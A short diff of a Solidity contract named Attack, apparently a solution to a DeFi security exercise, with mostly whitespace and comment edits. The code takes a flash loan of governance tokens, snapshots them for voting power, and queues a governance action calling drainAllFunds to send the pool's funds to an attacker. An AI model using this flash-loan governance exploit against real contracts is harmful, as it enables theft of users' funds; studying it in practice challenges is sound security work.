@@ -79,17 +79,13 @@ contract Attack{
         gvt = _gvt;
     }
 
-
-
     function attack() external{
-
         flashloan.flashLoan(gvt.governanceToken().balanceOf(address(flashloan)));
     }
 
     function receiveTokens(address,uint256 amount) external{
-                gvt.governanceToken().snapshot();
+        gvt.governanceToken().snapshot();
         id = gvt.queueAction(address(flashloan), abi.encodeWithSignature("drainAllFunds(address)", attacker), 0);
-        //address(gvt).call(abi.encodeWithSignature("drainAllFunds(address)",));
         gvt.governanceToken().transfer(address(flashloan), amount);
     }
 }
